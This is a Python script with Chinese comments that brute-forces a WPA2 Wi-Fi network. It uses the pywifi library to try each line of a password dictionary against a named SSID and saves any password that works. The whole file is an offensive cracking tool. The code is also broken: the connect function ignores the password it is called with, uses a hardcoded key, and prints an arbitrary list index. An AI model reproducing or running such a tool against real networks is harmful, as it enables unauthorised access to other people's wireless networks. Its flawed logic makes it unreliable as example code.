# 导入模块
# 抓取网卡接口T
# 断开所连wifi
# 读取密码本
# 测试连接
# 设置睡眠时间
import time
import pywifi
from pywifi import const  # 引用一些常量

# 测试连接，返回连接结果
def wificonnect():
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一张无线网卡
    ifaces = wifi.interfaces()[0]
    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        print("未连接")
        # 创建wifi连接文件
        profile = pywifi.Profile()
        # 要连接的wifi名称
        profile.ssid ="4fz"
        # 网卡开放
        profile.auth = const.AUTH_ALG_OPEN
        # WIFI加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = "pwd"
        # 删除所有的wifi连接文件
        ifaces.remove_all_network_profiles()
        # 设置新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 用新的连接文件去测试连接
        ifaces.connect(tep_profile)
        # wifi 连接时间
        time.sleep(1)
        if ifaces.status() == const.IFACE_CONNECTED:
            print("已连接")
            return True

        else:
            del profile
            return False

    # else:
    #     print("已连接")
#读取密码本
wificonnect()
def readPassword():
    print("开始破解：")
    #读取密码本路径
    path = "F:\\password.txt"
    #打开文件 只读
    #file = open(path, "r")
    passwordlist=list()
    with open(path ,'r',encoding='utf8') as f:
        for line in f:
            passwordlist.append(line)
    print(passwordlist[100002])
    while True:
        try:
            # 读取一行
           for passStr in passwordlist:
                bool= wificonnect(passStr)
                if bool:
                    print("密码正确", passStr)
                    dic = open("password.py", "a")
                    dic.write(passStr)
                    dic.write("".join("\n"))
                    break

                else:
                    print("密码不正确", passStr)

        except:
            continue

#readPassword()